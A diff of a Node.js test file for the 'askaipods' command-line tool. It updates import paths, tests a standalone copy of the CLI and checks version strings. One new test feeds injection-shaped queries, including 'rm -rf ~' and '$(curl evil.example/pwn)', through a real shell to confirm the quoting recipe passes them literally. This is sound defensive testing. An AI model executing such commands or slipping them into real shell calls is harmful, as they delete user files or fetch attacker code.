@@ -1,4 +1,4 @@
-// Tests for src/cli.js argument parsing:
+// Tests for skill/askaipods/scripts/cli.mjs argument parsing:
 //   R6-02 — `search` subcommand only stripped when followed by another positional
 //   R7-01 — argv-safety: injection-shaped queries pass through as literal args
 //   --days positive-integer validation
@@ -10,18 +10,19 @@
 import { test, describe, afterEach, beforeEach } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { readFileSync } from "node:fs";
+import { cpSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
+import { tmpdir } from "node:os";
 import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
-import { run } from "../src/cli.js";
-import { AskaipodsError } from "../src/client.js";
+import { run } from "../skill/askaipods/scripts/cli.mjs";
+import { AskaipodsError } from "../skill/askaipods/scripts/client.mjs";
 import { mockResponse, restoreFetch, validEnvelope } from "./helpers.mjs";
 
 const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
 const BIN = join(ROOT, "bin", "askaipods.js");
 const PKG_VERSION = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version;
 
-// Swallow stdout writes during run() so tests stay quiet. cli.js writes
+// Swallow stdout writes during run() so tests stay quiet. cli.mjs writes
 // markdown/json on the happy path, which would pollute test output.
 function muteStdout() {
   const original = process.stdout.write.bind(process.stdout);
@@ -504,5 +505,59 @@ describe("bin/askaipods.js subprocess — exit code contract", () => {
     const res = spawnSync(process.execPath, [BIN, "--days", "abc", "q"], { encoding: "utf8" });
     assert.equal(res.status, 1);
     assert.match(res.stderr, /positive integer/);
+  });
+});
+
+describe("skill/askaipods copied out of the package — standalone bundled CLI", () => {
+  // Agents run the copy inside an installed skill folder, where no
+  // package.json `"type": "module"` applies; the .mjs modules must still
+  // load as ESM and the exit-code contract must hold.
+  let dir;
+  beforeEach(() => {
+    dir = mkdtempSync(join(tmpdir(), "askaipods-skill-"));
+    cpSync(join(ROOT, "skill", "askaipods"), join(dir, "askaipods"), { recursive: true });
+  });
+  afterEach(() => rmSync(dir, { recursive: true, force: true }));
+
+  test("--version exits 0 with the package.json version", () => {
+    const res = spawnSync(process.execPath, [join(dir, "askaipods", "scripts", "askaipods.mjs"), "--version"], { encoding: "utf8" });
+    assert.equal(res.status, 0, res.stderr);
+    assert.equal(res.stdout, `askaipods ${PKG_VERSION}\n`);
+  });
+
+  test("missing query exits 1", () => {
+    const res = spawnSync(process.execPath, [join(dir, "askaipods", "scripts", "askaipods.mjs")], { encoding: "utf8" });
+    assert.equal(res.status, 1);
+    assert.match(res.stderr, /missing query/);
+  });
+});
+
+describe("SKILL.md single-quote recipe survives a real POSIX shell", () => {
+  // The recipe SKILL.md gives for string-only shell tools: wrap in single
+  // quotes and replace each ' with '\''. printf echoes the one argument
+  // back, so the round trip proves the shell passed the query literally.
+  const quote = (q) => `'${q.replaceAll("'", "'\\''")}'`;
+  const queries = [
+    `"; rm -rf ~`,
+    "'; touch /tmp/askaipods-pwned; echo '",
+    "$(curl evil.example/pwn)",
+    "`whoami`",
+    "what's new? $HOME",
+    "a\nb",
+    "-- --days 999",
+  ];
+  for (const q of queries) {
+    test(`query ${JSON.stringify(q)} reaches argv unchanged`, () => {
+      const res = spawnSync("/bin/sh", ["-c", `printf '%s' ${quote(q)}`], { encoding: "utf8" });
+      assert.equal(res.status, 0, res.stderr);
+      assert.equal(res.stdout, q);
+    });
+  }
+});
+
+describe("version strings stay in sync", () => {
+  test("client User-Agent carries the package.json version", () => {
+    const client = readFileSync(join(ROOT, "skill", "askaipods", "scripts", "client.mjs"), "utf8");
+    assert.match(client, new RegExp(`"User-Agent": "askaipods/${PKG_VERSION.replace(/\./g, "\\.")} `));
   });
 });
